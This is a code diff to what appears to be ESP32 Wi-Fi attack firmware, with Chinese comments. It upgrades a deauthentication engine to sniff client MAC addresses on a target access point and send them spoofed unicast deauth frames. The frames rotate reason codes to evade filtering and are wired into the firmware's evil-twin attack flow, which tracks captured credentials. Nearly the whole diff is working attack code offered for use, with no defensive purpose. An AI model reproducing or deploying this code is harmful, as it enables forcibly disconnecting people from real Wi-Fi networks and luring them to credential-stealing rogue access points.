@@ -447,6 +447,14 @@ struct DeauthEngine {
   // 泛洪用同一源 MAC 完成 "认证 → 关联" 两阶段 (未认证的 AssocReq 会被真实 AP 直接丢弃)
   uint8_t  floodMac[6] = {0};
   bool     assocAuthPhase = true;
+  // —— 客户端定向解除认证 ——
+  // 广播 Deauth 在多数 Wi-Fi 6 手机/Windows 网卡上被驱动层直接丢弃 (帧数一直涨但目标无反应),
+  // 因此从空口数据帧学习与该 AP 关联的客户端 MAC, 改为单播定向踢线。
+  uint8_t  targetMac[6] = {0}; // targetBssid 的二进制形式 (逐帧比对, 避免重复解析字符串)
+  bool     targetMacReady = false;
+  uint32_t unicastCount = 0;   // 成功发出的单播 Deauth 帧数
+  uint32_t unicastCycle = 0;   // 单播/广播轮换游标 (每 4 帧留 1 帧广播兜底)
+  uint8_t  reasonCycle = 0;    // 单播原因码轮换游标
 };
 static DeauthEngine sDeauth;
 
@@ -505,6 +513,76 @@ static bool buildDeauthFrameRaw(const String &bssidIn, uint8_t reason, uint8_t *
 
 static void buildDeauthFrame(DeauthEngine &d) {
   d.frameReady = buildDeauthFrameRaw(d.targetBssid, d.reasonCode, d.frame);
+  d.targetMacReady = parseBssid(d.targetBssid, d.targetMac);
+}
+
+/* ---- 客户端 MAC 学习 (定向单播踢线) ----
+ * 数据帧的地址组合即可判定「谁在跟目标 AP 通信」:
+ *   ToDS=1/FromDS=0: DA=AP(addr1) / SA=客户端(addr2)
+ *   ToDS=0/FromDS=1: DA=客户端(addr1) / SA=AP(addr2)
+ * 只记录 MAC 与时间戳, 不解析载荷、不落盘、不外传。
+ */
+static const int MAX_KNOWN_STAS = 12;
+struct KnownSta { uint8_t mac[6]; uint32_t lastSeen; uint32_t frames; };
+static KnownSta sKnownStas[MAX_KNOWN_STAS];
+static uint8_t sKnownStaCount = 0;
+static uint8_t sKnownStaCursor = 0;
+
+static String formatMac(const uint8_t *m);   // 前置声明 (定义在下方)
+
+static void resetKnownStas() {
+  memset(sKnownStas, 0, sizeof(sKnownStas));
+  sKnownStaCount = 0;
+  sKnownStaCursor = 0;
+  sDeauth.unicastCount = 0;
+  sDeauth.unicastCycle = 0;
+  sDeauth.reasonCycle = 0;
+}
+
+// 单播 Deauth: DA=客户端, TA/BSSID=目标 AP。WPA2 (未协商 PMF) 客户端必定处理。
+static bool buildUnicastDeauth(const uint8_t *dst, const uint8_t *bssid, uint8_t reason, uint8_t *f) {
+  if (!dst || !bssid) return false;
+  f[0] = 0xC0; f[1] = 0x00;
+  f[2] = 0x3A; f[3] = 0x01;
+  memcpy(f + 4,  dst, 6);      // Address 1: 接收端 (具体客户端)
+  memcpy(f + 10, bssid, 6);    // Address 2: 发送端 (目标 AP)
+  memcpy(f + 16, bssid, 6);    // Address 3: BSSID
+  f[22] = 0x00; f[23] = 0x00;  // 序列号由系统填充
+  f[24] = reason & 0xFF; f[25] = 0x00;
+  return true;
+}
+
+// 从空口帧学习目标 AP 下的客户端 MAC (仅当 Deauth 引擎运行且目标已就绪)
+static void learnClientMac(const uint8_t *f, int len) {
+  if (len < 24 || !sDeauth.targetMacReady) return;
+  if (((f[0] >> 2) & 0x03) != 2) return;              // 只取数据帧 (含 QoS/Null/EAPOL)
+  const bool toDs = (f[1] & 0x01) != 0;
+  const bool fromDs = (f[1] & 0x02) != 0;
+  if (toDs == fromDs) return;                          // IBSS / WDS 不作数
+  const uint8_t *bssid = toDs ? (f + 4) : (f + 10);
+  const uint8_t *sta   = toDs ? (f + 10) : (f + 4);
+  if ((sta[0] & 0x01) || (bssid[0] & 0x01)) return;    // 组地址跳过
+  if (memcmp(bssid, sDeauth.targetMac, 6) != 0) return;
+  if (memcmp(sta, sDeauth.targetMac, 6) == 0) return;
+  for (int i = 0; i < sKnownStaCount; i++) {
+    if (memcmp(sKnownStas[i].mac, sta, 6) == 0) {
+      sKnownStas[i].lastSeen = millis();
+      sKnownStas[i].frames++;
+      return;
+    }
+  }
+  int slot = -1;
+  if (sKnownStaCount < MAX_KNOWN_STAS) {
+    slot = sKnownStaCount++;
+  } else {                                             // 表满: 淘汰最久未活动的条目
+    slot = 0;
+    for (int i = 1; i < MAX_KNOWN_STAS; i++)
+      if (sKnownStas[i].lastSeen < sKnownStas[slot].lastSeen) slot = i;
+  }
+  memcpy(sKnownStas[slot].mac, sta, 6);
+  sKnownStas[slot].lastSeen = millis();
+  sKnownStas[slot].frames = 1;
+  log("[deauth] 发现目标客户端 " + formatMac(sta) + " → 转为定向单播踢线");
 }
 
 // —— 组合攻击用的附加帧构造 (全部为真实 802.11 管理/数据帧) ——
@@ -915,9 +993,26 @@ static esp_err_t deauthSendTech(uint16_t tech) {
   const uint8_t curCh = apChannelActive ? apChannelActive : sDeauth.targetChannel;
   int len = 0;
   switch (tech) {
-    case ATK_DEAUTH:
+    case ATK_DEAUTH: {
       if (!sDeauth.frameReady) return ESP_ERR_INVALID_ARG;
+      // 已学到客户端 MAC → 以定向单播为主 (广播 Deauth 常被 Wi-Fi 6 手机静默丢弃)。
+      // 每 4 帧保留 1 帧广播, 覆盖「一直没发过包、还没被学到」的设备。
+      if (sKnownStaCount > 0 && sDeauth.targetMacReady &&
+          ((sDeauth.unicastCycle++ % 4) != 3)) {
+        uint8_t uf[26];
+        const uint8_t *sta = sKnownStas[sKnownStaCursor % sKnownStaCount].mac;
+        sKnownStaCursor = (uint8_t)((sKnownStaCursor + 1) % sKnownStaCount);
+        // 原因码轮换: 1=未指定 3=STA 离开 7=未关联 15=4-way 超时, 避免被客户端按固定码过滤
+        static const uint8_t reasons[4] = {1, 3, 7, 15};
+        const uint8_t reason = reasons[sDeauth.reasonCycle++ & 0x03];
+        if (buildUnicastDeauth(sta, sDeauth.targetMac, reason, uf)) {
+          const esp_err_t ue = wifi80211Tx(WIFI_IF_AP, uf, (int)sizeof(uf), true);
+          if (ue == ESP_OK) sDeauth.unicastCount++;
+          return ue;
+        }
+      }
       return wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
+    }
     case ATK_DISASSOC:
       if (!buildDisassocFrameRaw(sDeauth.targetBssid, 1, buf)) return ESP_ERR_INVALID_ARG;
       len = 26;
@@ -2480,6 +2575,9 @@ static void onPromiscuousFrame(void *buf, wifi_promiscuous_pkt_type_t type) {
   const uint8_t ftype = (f[0] >> 2) & 0x03;
   const uint8_t sub = (f[0] >> 4) & 0x0F;
 
+  // Deauth 引擎运行期间顺带学习目标 AP 下的客户端 MAC (用于定向单播踢线)
+  if (sDeauth.running) learnClientMac(f, len);
+
   // P4-3: Beacon / ProbeResp 的 Remote ID 每帧只解析一次, 供 Sniffer 展示与 /api/rid 共用
   RidData rid;
   bool hasRid = false;
@@ -2521,7 +2619,10 @@ static bool syncPromiscuousEngine() {
     mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
   }
   if (sDeauth.running && sDeauth.frameReady) {
-    mask |= WIFI_PROMIS_FILTER_MASK_MGMT;   // Deauth 注入仅需要 prom 状态本身, 接收帧无观察者
+    // 注入本身只需 prom 处于开启状态; 同时收数据帧用于学习目标 AP 下的客户端 MAC
+    // (单播定向踢线), 否则只能发广播帧, 而广播 Deauth 常被 Wi-Fi 6 终端静默丢弃。
+    mask |= WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA |
+            WIFI_PROMIS_FILTER_MASK_DATA_MPDU | WIFI_PROMIS_FILTER_MASK_DATA_AMPDU;
   }
   if (sHandshake.capturing) {
     // Wi-Fi 6 AP 的 M1/M3 (FromDS) 常被装进 A-MPDU 聚合发出, 只开 DATA 位会漏掉聚合内的帧,
@@ -2706,6 +2807,7 @@ static bool eviltwinStartAttack(String &err) {
   sDeauth.targetBssid   = sTarget.bssid;
   sDeauth.targetChannel = (uint8_t)sTarget.channel;
   buildDeauthFrame(sDeauth);
+  resetKnownStas();
   sDeauth.channelMoved   = false;
   sDeauth.restoreChannel = apChannel;
   sDeauth.txOk = false; sDeauth.lastTxErr = 0;
@@ -3110,6 +3212,8 @@ static void sendInfo() {
           ",\"credsCount\":" + String(sCredCount) + "},";
   json += "\"deauth\":{\"running\":" + String(sDeauth.running ? "true" : "false") +
           ",\"count\":" + String(sDeauth.frameCount) +
+          ",\"unicast\":" + String(sDeauth.unicastCount) +
+          ",\"knownStas\":" + String(sKnownStaCount) +
           ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
           ",\"channel\":" + String(sDeauth.targetChannel) +
           ",\"mode\":" + String(sDeauth.primaryMode) +
@@ -3551,6 +3655,7 @@ static void handleDeauthStart() {
   sDeauth.stopAt = sDeauth.durationMs ? (sDeauth.startedAt + sDeauth.durationMs) : 0;
   // 预构 Deauth 管理帧; BSSID 非法则不发送 (只报告, 不再空转计数)
   buildDeauthFrame(sDeauth);
+  resetKnownStas();
   sDeauth.txOk = false;
   sDeauth.lastTxErr = 0;
   // 信道对齐: 单射频只能在本机信道发帧 → 攻击前把热点临时切到目标信道, 停止时恢复配置信道
@@ -3661,6 +3766,8 @@ static void handleDeauthStatus() {
   String json = "{";
   json += "\"running\":" + String(sDeauth.running ? "true" : "false") + ",";
   json += "\"count\":" + String(sDeauth.frameCount) + ",";
+  json += "\"unicast\":" + String(sDeauth.unicastCount) + ",";
+  json += "\"knownStas\":" + String(sKnownStaCount) + ",";
   json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
   json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
   json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
